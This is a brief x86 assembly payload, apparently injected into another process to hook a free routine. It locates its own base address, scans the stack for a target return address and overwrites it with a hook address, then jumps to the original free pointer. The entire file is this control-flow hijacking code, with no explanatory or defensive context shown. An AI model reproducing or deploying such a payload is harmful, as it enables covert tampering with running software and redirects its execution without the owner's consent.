%include 'defines.asm'

; config
%define config_scan_size 0x180

; args
%define arg_str 8
%define arg_file 12
%define arg_line 16

; prologue
enter 0, 0
push ebx
push esi
call back
back:   pop ebx
        and ebx, 0xFFFFF000

; scanning the stack
mov esi, DWORD payload_find_ret_addr[ebx]
mov eax, ebp
add eax, config_scan_size
scan:   sub eax, 4
        cmp eax, ebp
        je done
        cmp esi, DWORD [eax]
        jne scan
        mov esi, DWORD payload_hook_ret_addr[ebx]
        mov DWORD [eax], esi

; fetch resume address
done:   mov eax, DWORD payload_org_free_ptr[ebx]

; epilogue
pop esi
pop ebx
leave
jmp eax
